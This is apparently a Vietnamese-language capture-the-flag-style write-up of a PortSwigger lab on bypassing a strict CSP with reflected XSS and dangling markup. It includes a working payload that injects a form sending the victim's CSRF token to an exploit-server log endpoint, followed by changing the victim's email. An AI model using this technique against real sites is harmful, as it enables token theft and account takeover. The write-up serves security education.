# Target Goal: 

This lab using a strict CSP that blocks outgoing requests to external web sites.

To solve the lab, first perform a cross-site scripting attack that bypasses the CSP and exfiltrates a simulated victim user's CSRF token using Burp Collaborator. You then need to change the simulated user's email address to hacker@evil-user.net.

You must label your vector with the word "Click" in order to induce the simulated user to click it. For example:

`<a href="">Click me</a>`

You can log in to your own account using the following credentials: `wiener:peter`

# Recon: 

Phần nhắm đến để tấn công sẽ là đổi email do đó từ mục nhập email, ta có thể inject vào và thử xem có thể thoát ra dc k

![image](https://github.com/vanniichan/Portswigger/assets/112863484/018f0ae1-3160-408f-b92f-9d18642a52f3)

![image](https://github.com/vanniichan/Portswigger/assets/112863484/c7e5527d-0cfd-4ce2-949d-532b1bce17b9)

Sau khi inject vào cta thấy được k thể xem được nội dung của link. Lý do như tiêu đề của bài lab. Nó đã được CSP bảo vệ

![image](https://github.com/vanniichan/Portswigger/assets/112863484/78aa0fb3-1ed8-4f6d-b540-3368f72dcb5e)

Vậy thì bypass CSP kiểu gì? Vì nó đã chặn xem nội dung của trang ngoài nên chúng ta k thể tiến hành tấn công tự động mà bắt buộc phải cần tương tác 
`<a href="https://google.com/dnkas">Click me</a>`

![image](https://github.com/vanniichan/Portswigger/assets/112863484/4b13d7cc-2a9b-4ea2-8bef-11576f981fdc)

Tiếp theo để lấy được nội dung, rằng ở đây chúng ta cần đó chính là csrf token thậm chí là nhiều hơn thế. Sử dụng [tag base target](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base)

![image](https://github.com/vanniichan/Portswigger/assets/112863484/b4183055-b526-4f76-8d30-2921ff10a8f7)

Lý do k đóng " là bởi khi không đóng. Trình duyệt sẽ hiểu rằng nội dung của nó sẽ chưa kết thúc và sẽ tìm đến phần kết thúc khác ( ở đâu có thể hiểu được là phần đóng tag ở dưới). Đây chính là tấn công "dangling markup"

![image](https://github.com/vanniichan/Portswigger/assets/112863484/2a9056c8-15b3-4c81-ab1f-785a64d38042)

Từ trên ta có payload sau: Nếu chưa có thông tin gì (window.name) thì ta sẽ dùng `else` mục đích giải thích ở trên. Sau đó khi đã có thông tin nó sẽ gửi về request của `Burp collabor`. Vì browser của victim chạy bằng Chrome nên khôg thể dùng payload của solution. Tôi tìm được 1 payload khác ở [bài này](https://skullhat.github.io/posts/reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack/)

```
<script>
location='https://0ac900f803f0a62583a5a634009b002e.web-security-academy.net/my-account?email=%22%3E%3C/form%3E%3Cform%20class=%22login-form%22%20name=%22evil-form%22%20action=%22https://exploit-0ac8002403eba6ea8339a50d01ea00a2.exploit-server.net/log%22%20method=%22GET%22%3E%3Cbutton%20class=%22button%22%20type=%22submit%22%3E%20Click%20me%20%3C/button%3E';
</script>
```

![image](https://github.com/vanniichan/Portswigger/assets/112863484/5e964adb-28f6-469b-8dec-743b48a19691)

Sau khi lấy được csrf từ victim ta tiến hành thay đổi email. Tuy nhiên respond sẽ báo rằng invalid csrf token lý do là thực ra mình còn thiếu session của victim. Ta phải lừa victim 1 lần nữa :))

![image](https://github.com/vanniichan/Portswigger/assets/112863484/1e0a1f95-0c5e-4da2-b57a-c99a8d5a185f)

Gửi [Payload](https://github.com/vanniichan/Portswigger/blob/main/Cross-site%20scripting/Lab_29/Lab-29_payload.js) vào server và exploit và thành công

# Flag: 

![image](https://github.com/vanniichan/Portswigger/assets/112863484/d50aed6a-8ff4-4748-90f9-6fdf1826a44f)
